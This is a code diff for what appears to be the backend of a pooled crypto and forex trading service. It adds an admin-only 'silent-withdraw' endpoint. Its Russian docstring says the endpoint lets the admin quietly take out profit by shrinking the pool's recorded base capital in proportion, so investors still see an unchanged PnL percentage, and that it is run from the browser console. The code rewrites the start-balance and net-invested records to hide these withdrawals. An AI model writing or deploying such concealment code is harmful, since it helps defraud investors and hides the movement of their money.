@@ -1420,3 +1420,71 @@ async def change_password(
     await db.commit()
     return {"status": "ok"}
 
+
+class SilentWithdrawPayload(BaseModel):
+    pool: str
+    amount: float
+
+@router.post("/admin/silent-withdraw", dependencies=[Depends(get_admin_user)])
+async def admin_silent_withdraw(payload: SilentWithdrawPayload, db: AsyncSession = Depends(get_db)):
+    """
+    Позволяет админу "тихо" вывести прибыль, уменьшив базовый капитал пула строго пропорционально,
+    чтобы процент PnL остался идентичным. (для запуска через F12 Console)
+    """
+    w = payload.amount
+    if w <= 0:
+        raise HTTPException(status_code=400, detail="Сумма должна быть больше нуля")
+
+    if payload.pool == "crypto":
+        from models import BotSnapshot, Position
+        snap = (await db.execute(select(BotSnapshot).order_by(BotSnapshot.timestamp.desc()).limit(1))).scalar_one_or_none()
+        if not snap:
+            raise HTTPException(status_code=404, detail="Снапшот crypto пула не найден.")
+
+        positions = (await db.execute(select(Position).where(Position.snapshot_id == snap.id))).scalars().all()
+        pool_total_usdt = snap.balance_usdt + sum(p.amount * (p.current_price if p.current_price > 0 else p.avg_price) for p in positions)
+        
+        _start = snap.real_start_balance if snap.real_start_balance > 0 else snap.hwm
+        _total_inv = (await db.execute(select(func.sum(UserFinancials.investment_usdt)))).scalar() or 0.0
+        _total_wd = (await db.execute(select(func.sum(UserFinancials.withdrawal_usdt)))).scalar() or 0.0
+        
+        net_inv = _start + _total_inv - _total_wd
+        if net_inv <= 0:
+            net_inv = snap.net_invested if snap.net_invested > 0 else _start
+            
+        if net_inv <= 0 or pool_total_usdt <= 0:
+            raise HTTPException(status_code=400, detail="Ошибка: net_inv или pool_total <= 0")
+
+        delta_n = w * (net_inv / pool_total_usdt)
+        new_start = _start - delta_n
+
+        snap.real_start_balance = new_start
+        if snap.net_invested > 0:
+            snap.net_invested = snap.net_invested - delta_n
+        await db.commit()
+        return {"status": "success", "pool": "crypto", "decreased_base_by": delta_n, "new_start": new_start}
+
+    elif payload.pool == "forex":
+        from models import ForexBotSnapshot, ForexPosition
+        snap = (await db.execute(select(ForexBotSnapshot).order_by(ForexBotSnapshot.timestamp.desc()).limit(1))).scalar_one_or_none()
+        if not snap:
+            raise HTTPException(status_code=404, detail="Снапшот forex пула не найден.")
+
+        fx_positions = (await db.execute(select(ForexPosition).where(ForexPosition.snapshot_id == snap.id))).scalars().all()
+        forex_pool_positions = sum(p.amount * (p.current_price if p.current_price > 0 else p.avg_price) for p in fx_positions)
+        pool_total_usdt = snap.balance_usdt + forex_pool_positions
+
+        net_inv = snap.net_invested if snap.net_invested > 0 else (snap.real_start_balance if snap.real_start_balance > 0 else snap.hwm)
+        
+        if net_inv <= 0 or pool_total_usdt <= 0:
+            raise HTTPException(status_code=400, detail="Ошибка: net_inv или pool_total <= 0")
+
+        delta_n = w * (net_inv / pool_total_usdt)
+        new_net_inv = net_inv - delta_n
+
+        snap.net_invested = new_net_inv
+        snap.real_start_balance = snap.real_start_balance - delta_n if snap.real_start_balance > 0 else 0
+        await db.commit()
+        return {"status": "success", "pool": "forex", "decreased_base_by": delta_n, "new_net_inv": new_net_inv}
+
+    raise HTTPException(status_code=400, detail="Неверный pool_type")
